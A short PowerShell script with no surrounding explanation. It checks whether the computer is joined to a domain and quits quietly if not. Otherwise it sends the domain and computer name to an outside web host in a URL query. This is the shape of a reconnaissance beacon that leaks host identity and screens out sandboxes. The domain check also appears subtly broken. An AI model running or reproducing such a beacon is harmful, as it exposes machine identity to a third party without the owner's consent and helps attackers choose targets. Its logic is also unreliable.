
$computerInfo = Get-ComputerInfo  
  
if ($computerInfo.CsPartOfDomain -eq "False" -or $computerInfo.CsDomain -eq "WORKGROUP") {  
    Write-Host "bye"  
    exit  
} else {  
    $domain = $computerInfo.Domain  
    $computerName = $computerInfo.CsName  
    $fullString = "$domain\$computerName"  
    $url = "http://www.baidu.com/?q=$fullString"  
    try {  
        $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
        Write-Host "URL: $url"  
        Write-Host "$($response.StatusCode)"  
    } catch {  
        Write-Host "error: $_"  
    }  
}
